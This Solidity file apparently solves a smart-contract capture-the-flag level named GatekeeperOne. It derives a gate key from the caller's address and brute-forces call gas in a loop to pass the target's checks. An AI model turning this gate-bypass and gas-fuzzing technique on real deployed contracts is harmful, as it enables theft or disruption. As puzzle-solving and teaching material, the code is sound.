// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperOne {
    address immutable private TARGET;
    bytes8 immutable private GATEKEY;

    constructor(address target){
        TARGET = target;
        // gate key:
        // low 16 bit: low 16 bit of tx.origin
        // low 32 ~ 17 bits: 0
        // low 64 ~ 33 bits: not 0
        GATEKEY = bytes8(uint64(uint16(uint160(msg.sender))) + (1 << 32));
    }

    // NOTE: gasDesiredBase is not the exact gas value to pass, it has offset
    // try to find the exact gas value with for-loop
    function attack(uint gasDesiredBase) external {
        // violent enumeration base on gasDesiredBase
        for (uint i = 0; i < 300; ++i) {
            (bool success,) = TARGET.call{gas: gasDesiredBase + i}(
                abi.encodeWithSelector(IGatekeeperOne.enter.selector, GATEKEY)
            );

            if (success) {
                return;
            }
        }
    }

    // get the desired gas(base on this) to pass GatekeeperOne.gateTwo with eth_call
    // if the return value is true
    function getGasDesiredBase(uint gasBaseTest) external returns (bool){
        (bool success,) = TARGET.call{gas: gasBaseTest}(
            abi.encodeWithSelector(IGatekeeperOne.enter.selector, GATEKEY)
        );

        return success;
    }
}
